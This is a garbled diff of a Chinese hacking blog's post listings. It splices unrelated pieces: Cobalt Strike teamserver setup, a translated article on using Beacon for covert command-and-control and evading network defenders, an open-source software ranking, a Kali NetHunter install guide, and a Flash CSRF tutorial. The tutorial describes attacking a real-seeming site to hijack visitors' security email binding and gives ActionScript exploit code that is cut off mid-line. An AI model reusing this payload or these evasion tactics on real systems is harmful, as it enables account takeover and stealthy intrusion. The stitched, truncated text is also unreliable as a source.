<p>metasploit有3个版本专业版，社区版，和git上面的版本，当然大家用社区版就行了，专业版的功能比起社区版要多，但是要给钱，只能免费使用一段时间，以前找到的无限免费使用专业版也被官方封锁了，git上的版本适合高级安装的用户，具体可以自己去玩玩。</p>  <p>下载安装好社区版的metasploit后接下来就是要激活第一次访问metasploit的web管理页面必须是localhost，这好似规定死的，我这里有两种方法1.给服务器开启VNC，然后上去激活（不推荐）2.连接ssh的时候开启socks5然后游览器设置下就可以访问了。</p>  <p>还有一中快捷的安装方式就是上传<a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a>搭服务器，在里面有个quick-msf-setup 的脚本，它可以帮你快熟部署团体服务器环境，不过我不喜欢这种方式，我比较喜欢折腾，嘿嘿。</p>  <p>3.部署Cobalt Strike</p>  <p>将下载好的 <a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a> 上传到服务器，解包后会有这些文件</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image001.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image001_thumb.jpg" width="847" height="509" /></a></p>  <p>Cobalt Strike是JAVA写的，服务器还得有JAVA环境，这里我们没必要去下载JAVA来安装，metasploit已经有了JAVA环境，我们只需要配置下环境变量就行了    <br />打开root目录下的.bashrc文件，建议先备份，在最下面添加：</p>  <p>#JAVA</p>  <p>export JAVA_HOME=/opt/metasploit/java</p>  <p>&#160;&#160;&#160; export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH</p>  <p>然后在执行</p>  <blockquote>   <p>source .bashrc</p> </blockquote>  <p>最后看看是否成功</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image002.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image002_thumb.jpg" width="1284" height="772" /></a></p>  <p>回到Cobalt Strike目录</p>  <p>执行</p>  <blockquote>   <p>./teamserver 服务器IP 连接密码</p> </blockquote>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image003_thumb.jpg" width="554" height="185" /></a></p>  <p>启动的过程中会有很多警告，不用理会它，大概几分钟后出现这个就OK了</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image004.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image004_thumb.jpg" width="847" height="509" /></a></p>  <p>这里不要关闭，然后本机启动Cobalt Strike 连接测试</p>  <p>地址是:192.168.10.62</p>  <p>端口是:55553</p>  <p>用户名是:msf</p>  <p>密码是:luom&#160; (也就是我们刚才设置的)</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image005.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image005_thumb.jpg" width="331" height="205" /></a></p><br>
-        
-          <p class="article-more-link">
-            <a href="/1082.seo/#more">Read More</a>
-          </p>
-        
+        <p>2014 过去了，在这一年里，OSC 总共收录了 5448 款开源软件，其中包括 1502 个国人开发的开源软件。从这些数据可以看出，国内的开源气氛越来越好，国内的开源正在蓬勃发展！</p>  <p>这里，在开源中国 2014 年最新收录的软件基础上，我们根据该软件的访问、收藏、交流分享和项目本身的更新频度等诸多角度角度，从而得出前 100 名最受欢迎的开源软件，仅供参考。希望以下列表能给大家一些启示和帮助，欢迎大家在评论中分享你的看法和想法～</p>  <p><strong>1. Amaze UI</strong></p>  <p><a href="http://www.oschina.net/p/amazeui">Amaze UI</a> 是中国首个开源 HTML5 跨屏前端框架。Amaze UI 是一个轻量级、Mobile first的前端框架， 基于开源社区流行前端框架编写。作者：<a href="http://my.oschina.net/Amazeui">@云适配</a></p>  <p><strong>2. CrossApp</strong></p>  <p><a href="http://www.oschina.net/p/crossapp">CrossApp</a> 是一款完全开源、免费、跨平台的移动应用开发引擎 。CrossApp 采用 C++ 开发（即将支持 JS 和 Lua 编写），可直接导出 iOS 和 Android 原生应用，拥有高性能，多控件，开发速度快的优势。作者：<a href="http://my.oschina.net/fireflygame">@大鸡蛋</a></p>  <p><strong>3. TeamTalk</strong></p>  <p><a href="http://www.oschina.net/p/teamtalk">TeamTalk</a> 是由蘑菇街开发的开源即时通讯解决方案，适用于中小型企业，提供可靠的消息传递机制；支持文字、图片、语音等富文本信息；文件收发等。作者：<a href="http://my.oschina.net/u/2266057">@TeamTalk</a></p>  <p><strong>4. ZUI</strong></p>  <p><a href="http://www.oschina.net/p/zui">zui</a> 是禅道项目管理软件团队在完善自己产品过程中形成的一个开源前端实践方案，帮助你快速构现代跨屏应用。简单美观，易于使用，快速构建简洁大方的现代web应用。作者：<a href="http://my.oschina.net/easysoft">@</a><a href="http://my.oschina.net/easysoft">春哥_禅道蝉知然之</a></p>  <p><strong>5. WebCollector</strong></p>  <p><a href="http://www.oschina.net/p/webcollector">WebCollector</a> 是一个无须配置、便于二次开发的JAVA爬虫框架（内核），它提供精简的的API，只需少量代码即可实现一个功能强大的爬虫。作者：<em><a href="http://my.oschina.net/crawlscript">@CrawlScript</a></em></p><br>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1082.seo/" data-id="cirz4nzqu007yoz76w1oollk4" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1104.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Armitage/">Armitage</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Cobalt-Strike/">Cobalt Strike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Metasploit/">Metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/meterpreter/">meterpreter</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1081" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1081.seo/" class="article-date">
-  <time datetime="2014-05-14T03:09:25.000Z" itemprop="datePublished">2014-05-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/原创文章/">原创文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1081.seo/">Cobalt Strike之Beacon的四个高级黑客技巧</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p></p>  <p><a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>是用于红队（受过职业训练的安全专家）行动的<a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a>的载荷。<a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>是一个稳定的生命线，它服务于通信层。Meterpreter是一个非常棒的有许多功能漏洞实施代理。<a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>和<a href="http://ha.cker.in/tag/meterpreter" target="_blank">Meterpreter</a>一起使用能在悄无声息的行动中提供更多选择。在这篇文章里，我将给大家演示几种不同的方法用Beacon充分利用<a href="http://ha.cker.in/tag/meterpreter" target="_blank">Meterpreter</a>和 <a href="http://ha.cker.in/tag/metasploit" target="_blank">Metasploit</a> Framework。</p>  <p><b>#0 </b><b>无</b><b>Beacon</b></p>  <p>先看看没有Beacon时我们一般怎么操作，在这种情况下，你的一切操作都必须通过Meterpreter。<a href="http://ha.cker.in/tag/meterpreter" target="_blank">Meterpreter</a>是你载荷的第一切入点，你要保证Meterpreter持续存在。同时Meterpreter也是你远程控制靶机和枢轴点的载荷。</p>  <p><a href="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image001.jpg" rel="external" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image001_thumb.jpg" width="454" height="408"></a></p>  <p>如果你用Meterpreter当作进入网络的切入点，你的第一个动作是要备份出更多的Meterpreter会话来增加机会。不然如果你丢失了仅有的Meterpreter会话，就丢掉了权限，这可不是此次行动的最好选择。Meterpreter会话貌似不怎么稳定，为了巩固我们费尽心思得到的权限和防止Meterpreter会话丢失迫在眉睫！！！</p>  <p><b>#1 Beacon</b><b>之命脉</b><b></b></p>  <p>我们还有另一个选项，使用Beacon作为网络切入点。就如其他的Metasploit Framework载荷的设计类似，你也要利用内存破坏漏洞或者<a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a>的社会工程学工具包发送Beacon，<a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>在内存运行后将立马通过HTTP或DNS查看任务。</p>  <p><a href="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image0016.jpg" rel="external" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[6]" border="0" alt="clip_image001[6]" src="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image0016_thumb.jpg" width="454" height="380"></a></p>  <p>Beacon的任务是指你想通过Beacon执行的命令，比如spawn命令将会去靶机请求一个Meterpreter会话。当你需要的时候Beacon是如此秘密的返回了你需要的Meterpreter会话。如果保持低调的秘密性对你很重要那么就无需返回会话，除非你万不得已地想和靶机交互。</p>  <p><b>#2 Beacon</b><b>出口</b><b></b></p>  <p><a href="http://ha.cker.in/tag/meterpreter" target="_blank">Meterpreter</a>提供了TCP、HTTP和HTTPS的反向连接网络出口，<a href="http://ha.cker.in/tag/meterpreter" target="_blank">Meterpreter</a>经常会出接口到一个主机，如果这台主机被网络防护团队拦截或监视了，你就会被坑得很有节奏了~这可不是闹着玩滴！</p>  <p><a href="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image0018.jpg" rel="external" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[8]" border="0" alt="clip_image001[8]" src="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image0018_thumb.jpg" width="454" height="366"></a></p>  <p>对此类情况，使用Beacon做枢轴点使出口流量传出目标网络。Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。请在日站时灵活的选择和使用需要的正确的协议。</p>  <p>Beacon支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。</p>  <p>Beacon公开了一个SOCKS代理服务器，它允许你使用一个信标主机作为枢轴点。这SOCKS代理服务器将通过Beacon隧道传输Metasploit Framework攻击、Meterpreter以及其他外部工具。</p>  <p>使用Beacon做枢轴点，你必须使Beacon每秒查看多次，如果你是通过高的sleep时间信标尝试通道流量，你会发现大多数工具将超时由于人为地高通信延迟。</p>  <p>使用Beacon做枢轴点将帮你工具通过许多边界防护。一旦你通过一个稳定的渠道隧道进入网络内部，你有很大的自由而不会中断工作。</p>  <p><b>#3 Beacon</b><b>通信层</b><b></b></p>  <p>并非所有系统都能Beacon到因特网上的主机，有时当你想控制一个连接不到你的系统，你可能会用bind Meterpreter载荷或者通过Meterpreter会话的反向TCP载荷。通常当Meterpreter会话丢失后就必须重新让Meterpreter运行到沦陷主机上。</p>  <p>有幸，我们还能通过发送bind载荷Beacon控制这些系统，bind Beacon载荷又叫Beacon peer，是一个运行在沦陷主机内存中的后门，你随时可以连接或断开或重新连接到Beacon peer后门。</p>  <p>Beacon peer后门也可通过SMB管道连接，首先你必须已经有另外的Beacon连接到靶机。已连接的Beacon将通过混合到正常的SMB网络流量来通讯。</p>  <p>你可以发送一个命令到任何存在Beacon的主机来请求一个Meterpreter会话，它的访问流量通过该Beacon隧道传输。<a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>成为了Meterpreter会话替代的通讯层。</p>  <p><a href="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image00110.jpg" rel="external" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[10]" border="0" alt="clip_image001[10]" src="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image00110_thumb.jpg" width="454" height="364"></a></p>  <p>如果你丢失了通过Beacon peer隧道的Meterpreter会话，就可以请求到一个新的Meterpreter会话而不需要在目标主机重新运行Meterpreter，并且目标主机并不需要连接到互联网。Beacon peer既可以作为枢轴点又是连接到一个深层网络的命脉！</p>  <p><b>#4 Beacon</b><b>的远程管理功能</b><b></b></p>  <p>有时，在目标网络外部获取一个稳定的Meterpreter会话是非常的困难，主机上的防护可能会拦截它，又或许通过隧道流量连入目标网络更易被发现，此时，<a href="http://ha.cker.in/tag/Beacon" target="_blank">Beacon</a>可以作为一个远程管理工具来使用。</p>  <p>如果你不通过Beacon隧道走网络流量那么可以设置一个较高的休眠眠时间，比如10分钟一次、1小时一次或者一天一次。这时Beacon会将查看和下载你提供的命令并加入执行队列后一个个的执行。</p>  <p><a href="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image00112.jpg" rel="external" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[12]" border="0" alt="clip_image001[12]" src="http://img.cker.in/CobaltStrikeBeacon_109BE/clip_image00112_thumb.jpg" width="454" height="386"></a></p>  <p>Beacon与许多的远程管理工具功能：上传、下载文件。Beacon将跟踪所有文件的下载，每次查看来抓取一个文件片段。这使得有可能在低和缓慢的方式取回一个大文件到多个回调主机。</p>  <p>Metasploit Framework是我们对大多数的黑客行动的通用接口，也就是说，我们在Metasploit Framework里做的事都是可独立执行的和内建Windows命令。如果你有个混淆漏洞实施利用工具包，你可以轻松加愉快的干活—你能通过Beacon执行大多数的日站指令而不降低休眠时间。</p>  <p>如果你仅仅使用较高休眠时间的Beacon来控制沦陷主机那么网络防护团队很难注意到你。</p>  <p><b>#Final 高级威胁对策？</b><b></b></p>  <p>这些每个选择相当于不同的复杂程度，当你了解到“APT”活动后，尝试匹配你正在阅读这些选项是什么。当你读到行动者使用极其简单的beaconing RAT，请问，他用什么实施漏洞利用？当你读到行动者使用Poison Ivy时，请问，他用什么作为立足点和维护权限？当你读到今年的某场入侵行动时，请问，行动者如何保护他们能自由的随时地恢复主机的控制而不引起任何的怀疑？当你听到关于暂时搁置的从未被抓到行动者列表时，请问，他们是怎么办到的？最后，当你看到高级威胁行动者时，请问，我如何帮到我的客户们了解到自身对于此类高级威胁的检测和响应能力？</p>  <p>&#160;</p>  <p><b>#</b>译自Cobalt Strike和Armitage作者博客：<a href="http://blog.strategiccyber.com/2014/01/31/four-levels-of-hacking-sophistication-with-beacon/" target="_blank" rel="external">http://blog.strategiccyber.com/2014/01/31/four-levels-of-hacking-sophistication-with-beacon/</a></p>  <p>第一次翻译，如有不足请不吝指点。</p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1081.seo/" data-id="cirz4nzqw0082oz76p1rv1t6s" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Beacon/">Beacon</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Cobalt-Strike/">Cobalt Strike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Metasploit/">Metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/meterpreter/">meterpreter</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1080" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1080.seo/" class="article-date">
-  <time datetime="2014-04-26T11:36:26.000Z" itemprop="datePublished">2014-04-26</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-01-24T11:50:07.000Z" itemprop="datePublished">
+          2015-01-24
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1080.seo/">Flash CSRF</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/Kali/'>Kali</a>,
     
-    <div class="article-entry" itemprop="articleBody">
+    <a href='/tag/NetHunter/'>NetHunter</a>,
+    
+    <a href='/tag/WarDriving/'>WarDriving</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1103.seo/">Pocket Hacking  NetHunter实战指南</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <h4>目录</h4>  <hr>  <pre><code>0x00 Flash CSRF名词解释<br>0x01 Flash CSRF形成的原因<br>0x02 Flash CSRF可以干些什么<br>0x03 Flash CSRF如何利用<br>0x04 Flash CSRF怎么防御<br></code></pre><br><br><h4>0x00 Flash CSRF名词解释</h4>
+        <p></p>  <h3>0x00 前言</h3>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p>许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.</p>  <p><a href="http://ha.cker.in/tag/kali" target="_blank">Kali</a> <a href="http://ha.cker.in/tag/NetHunter" target="_blank">NetHunter</a>是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android实现的便携渗透测试平台.熟悉的Kali使其易于上手,而图形化控制界面则使某些测试更易.基于此平台,工程师们也可自由发挥,加入个人项目.</p>  <p>关于NetHunter国内外文章相对较少且重复度高,故在此将其主要实战技巧加以整理介绍,以备各位爱好者参考.由于资料不足,难免出错之处,如有疏漏错误,望不吝赐教.</p>  <h3>0x01 硬件支持</h3>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p>NetHunter官网给出以下支持刷入NetHunter的手机:</p>  <pre><code>Nexus 4 (GSM) - &quot;mako&quot;</code></pre><br><br><pre><code>Nexus 5 (GSM/LTE) - &quot;hammerhead&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Wi-Fi) - &quot;nakasi&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Mobile) - &quot;nakasig&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Wi-Fi) - &quot;razor&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Mobile) - &quot;razorg&quot;</code></pre><br><br><pre><code>Nexus 10 (Tablet) - &quot;mantaray&quot;</code></pre><br><br><pre><code>OnePlus One 16 GB - &quot;bacon&quot;</code></pre><br><br><pre><code>OnePlus One 64 GB - &quot;bacon&quot;</code></pre><br><br><p>值得一提的是,2015年NetHunter更新,由于1+手机的廉价与高性能,其被加入支持列表.用1+手机的朋友有福了,以下刷机以Nexus5为例.</p>
 
-<hr>
+<h3>0x02 刷机流程</h3>
 
-<p>CSRF（Cross-site request forgery跨站请求伪造，是一种对网站的恶意利用，CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
+<hr align="left" size="5" width="100%" noshade="noshade" />
 
-<p>Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</p>
+<p>官网给出几种刷机方式,推荐使用Windows引导刷机程序安装.下载地址:</p>
 
-<h4>0x01 Flash CSRF形成的原因</h4>
+<p><a href="https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe">https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe</a></p>
 
-<hr>
+<p>打开安装引导程序,默认路径安装</p>
 
-<p>So 官腔我们也打了，还是要干点实事PS：:)</p>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[13]" border="0" alt="clip_image001[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113_thumb.png" width="1066" height="802" /></a></p>
 
-<p>为人民服务的好孩子，我们来看看如何寻找Flash CSRF:</p>
+<p>安装后自动运行NetHunter Installer并更新,进入引导安装步骤</p>
 
-<p>首先我们要知道怎么形成<a href="http://ha.cker.in/tag/CSRF" target="_blank">CSRF</a>的</p>
+<p>· Step1,选择已有硬件设备型号.</p>
 
-<p>PS:<a href="http://ha.cker.in/tag/CSRF" target="_blank">CSRF</a>形成的原因大概有以下几种：</p>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[13]" border="0" alt="clip_image002[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213_thumb.png" width="934" height="570" /></a></p>
 
-<p>Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据：</p>
+<p>· Step2,安装驱动</p>
 
-<pre>This XML file does not appear to have any style information associated with it. The document tree is shown below.
-&lt;cross-domain-policy&gt;&#160;&#160;&#160;&#160; &lt;allow-access-from domain=&quot;*&quot;/&gt;
-&lt;/cross-domain-policy&gt;</pre>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[13]" border="0" alt="clip_image003[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313_thumb.png" width="930" height="568" /></a></p>
 
-<p>Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。</p>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[12]" border="0" alt="clip_image004[12]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412_thumb.png" width="1448" height="778" /></a></p>
 
-<h4>0x02 如何来发现哪些地方存在Flash <a href="http://ha.cker.in/tag/CSRF" target="_blank">CSRF</a></h4>
+<p>可以通过Test Drivers测试是否安装成功</p>
 
-<hr>
+<p>· Step3,安装选项</p>
 
-<p>骚年们，前面我们介绍了形成Flash <a href="http://ha.cker.in/tag/CSRF" target="_blank">CSRF</a>的原因，我们是不是就可以对站下药了，难道又有一波个人资料被莫名被修改成“狗皮膏药”广告的节奏啊，敬告各位看官，看见了这篇文章之后请检查自己的站是否存在Flash CSRF以免减少被举报而带来的巨额损失啊（吊丝们对各位看官望尘莫及啊）：</p>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[15]" border="0" alt="clip_image001[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115_thumb.png" width="930" height="576" /></a></p>
 
-<p>由上面我们得知Flash CSRF是因为跨域权限管理文件配置不当而产生的，所以我们可以在根目录打开Crossdomain.xml来查看该网站或者只域名是否存在FLAH的CSRF：</p>
+<p>如已经通过官网下载过刷机包,通过Browser选择文件.下载链接 <a href="http://www.offensive-security.com/kali-linux-nethunter-download/">http://www.offensive-security.com/kali-linux-nethunter-download/</a> 下载后记得校验SHA1值.至于Android Flash Setting,因为对Android L的支持还未完成,故尚未开放选择.</p>
 
-<pre><code>http://www.xxx.com/crossdomain.xml
-</code></pre>
+<p>· Step4,下载文件</p>
 
-<pre>This XML file does not appear to have any style information associated with it. The document tree is shown below.
-&lt;cross-domain-policy&gt;
-&lt;allow-access-from domain=&quot;*&quot;/&gt;
-&lt;/cross-domain-policy&gt;</pre>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[15]" border="0" alt="clip_image002[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215_thumb.png" width="928" height="576" /></a></p>
 
-<h4>0x02 Flash CSRF可以干些什么</h4>
+<p>如图示,下载所有依赖文件.</p>
 
-<hr>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[15]" border="0" alt="clip_image003[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315_thumb.png" width="1382" height="816" /></a></p>
 
-<p>在一个月黑风高的夜晚，Flash CSRF慢慢的在向XX网靠近，下面说说我是怎么找到XX网的Flash CSRF和利用XX网的Flash CSRF直接修改访问者账号信息。</p>
+<p>所有依赖包都为Ready可进入下一步刷机.</p>
 
-<p>无聊的逛着各大新闻网站，感觉这些大部分新闻网站的新闻源都差不多没几下就看完了，最后觉得自己作为天朝一员还是应该关系关系下国家大事，就懵懂懂的打开了XX网，关心了下我国基本国情，始终耐不住寂寞，正好前两天学习了Flash CSRF的原理和危害，但是一直没找到东西练手，大家都知道天朝的网站是多么的牛B，但是也只是抱着试试的心态，完全就是小孩子玩玩泥巴而已了，玩笑时间到，回到正题:),我先打开xx网，按照刚刚前面查找该网站是否有Flash CSRF漏洞我们第一步该判断什么？没错就是看官们看到的这样，我也只是个凡人而已。。。。于是就有了如下的FlashCSRF漏洞查找流程：</p>
+<p>· Step5,解锁设备</p>
 
-<pre><code>Google hack:crossdomain filetype:xml
-</code></pre>
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[14]" border="0" alt="clip_image004[14]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414_thumb.png" width="930" height="576" /></a></p>
 
-<pre>This XML file does not appear to have any style information associated with it. The document tree is shown below.
-&lt;cross-domain-policy&gt;
-&lt;allow-access-from domain=&quot;*&quot; secure=”true”/&gt;
-&lt;/cross-domain-policy&gt;</pre>
-
-<p>Secure=true的意思是只允许通过安全链接来请求本域的数据。</p>
-
-<p>随手查看了发现前2个全都是需要用ssl证书加密了之后的网站里面的Flash的文件才能获取本域的内容，突然之间脑海就浮现了一种奇怪的想法，自己搭建SSL网站，然后调用Flash文件进去不就可以读他们网站的数据和发送post请求，可是又遇见瓶颈了，找了这么多地方我Flash还没有地方可以插的，在不屑努力下，找到BLOG根目录下面的CrossDomain.xml文件居然允许所有主机的Flash读取本域的数据-PS：），下面我们就试试BLOG页面,发现也有，当然耐心也是必须的。</p>
-
-<h4>0x03 Flash CSRF如何利用</h4>
-
-<hr>
-
-<p>我们找一个可以插入Flash的地方，插入我们自己写的Flash，访客访问我们网页就会执行我们写的脚本，下面我们来看看Flash CSRF具体利用方法。<br>  <br>So~下面我们来制造一个访客访问我们链接的时候，自动设置自己的密保邮箱：</p>
-
-<p>首先我们添加保密邮箱点提交，然后抓包分析它提交了什么内容，然后来构造我们的Flash CSRF利用代码,下面我们提交绑定保密邮箱请求，抓包分析它的数据。<br>  <br>申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：</p>
-
-<pre><code>POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com
-</code></pre>
-
-<p>由于我们之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以我们就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。</p>
-
-<p>利用代码：</p>
-
-<pre>package {&#160;&#160;&#160;&#160; import flash.display.Sprite;&#160;&#160;&#160;&#160; import flash.events.Event;&#160;&#160;&#160;&#160; import flash.net.*;&#160;&#160;&#160;&#160; import flash.text.TextField;&#160;&#160;&#160;&#160; public class url extends Sprite&#160;&#160;&#160;&#160; {&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; public function url()&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; {&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //获取当前页面userid/token&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var echo_txt:TextField = new TextField();&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var targetURL:String = &quot;http://xx.xx.cc&quot;;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var request:URLRequest = new URLRequest(targetURL);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; request.method = URLRequestMethod.GET;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; request.data = 